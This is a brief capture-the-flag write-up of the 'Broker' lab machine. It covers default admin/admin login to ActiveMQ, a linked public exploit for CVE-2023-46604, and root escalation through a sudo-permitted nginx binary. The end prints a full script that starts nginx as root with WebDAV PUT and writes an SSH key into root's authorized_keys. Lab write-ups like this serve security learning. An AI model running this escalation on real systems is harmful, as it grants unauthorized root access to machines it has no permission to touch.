+++
title = 'Broker (Easy Linux) - ActiveMQ'
description = 'Easy Linux'
writeup = true
hideMeta = true
+++

nmap scan.

![Broker (Easy Linux)-2.png](Broker%20%28Easy%20Linux%29-2.png)

Port 80 - HTTP.

![Broker (Easy Linux)-1.png](Broker%20%28Easy%20Linux%29-1.png)

Going to it shows a basic auth endpoint - simply using `admin`/`admin` logs us in.

![Broker (Easy Linux).png](Broker%20%28Easy%20Linux%29.png)

The page reveals the version.

![Broker (Easy Linux)-3.png](Broker%20%28Easy%20Linux%29-3.png)

Looks like there's an exploit for it?

![Broker (Easy Linux)-4.png](Broker%20%28Easy%20Linux%29-4.png)

The CVE is specifically related to the OpenWire protocol. Port 61616 has ActiveMQ OpenWire transport 5.15.15 running, so this exploit should work.

Good public exploit, written in Go:

https://github.com/rootsecdev/CVE-2023-46604

Cloned the repo, installed Go, followed the instructions.

![Broker (Easy Linux)-5.png](Broker%20%28Easy%20Linux%29-5.png)

![Broker (Easy Linux)-6.png](Broker%20%28Easy%20Linux%29-6.png)

We see that we can run a binary with sudo.

![Broker (Easy Linux)-7.png](Broker%20%28Easy%20Linux%29-7.png)

Searching up the binary + "lpe sudo":

https://gist.github.com/DylanGrl/ab497e2f01c7d672a80ab9561a903406

Following the instructions, we can add an SSH key and use it to SSH in as root:

```bash
echo "[+] Creating configuration..."
cat << EOF > /tmp/nginx_pwn.conf
user root;
worker_processes 4;
pid /tmp/nginx.pid;
events {
        worker_connections 768;
}
http {
	server {
	        listen 1339;
	        root /;
	        autoindex on;
	        dav_methods PUT;
	}
}
EOF
echo "[+] Loading configuration..."
sudo nginx -c /tmp/nginx_pwn.conf
echo "[+] Generating SSH Key..."
ssh-keygen
echo "[+] Display SSH Private Key for copy..."
cat .ssh/id_rsa
echo "[+] Add key to root user..."
curl -X PUT localhost:1339/root/.ssh/authorized_keys -d "$(cat .ssh/id_rsa.pub)"
echo "[+] Use the SSH key to get access"
```

![Broker (Easy Linux)-8.png](Broker%20%28Easy%20Linux%29-8.png)

Root.
